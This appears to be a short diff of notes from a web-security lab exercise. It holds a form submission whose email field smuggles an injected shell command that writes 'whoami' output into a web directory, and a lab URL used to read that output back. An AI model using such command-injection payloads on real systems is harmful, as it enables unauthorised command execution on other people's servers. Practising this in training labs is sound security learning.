@@ -1,0 +1,4 @@
+csrf=T50IejOpTofT7NZ9GT88xkBcVMS9s3xt&name=Kiddie&email=kiddie%40test.com;whoami > /var/www/images/output.txt;&subject=Kiddie&message=hello
+
+// Access the output with this web function
+https://ac4e1f4b1fdace8880d52a74005500ed.web-security-academy.net/image?filename=output.txt
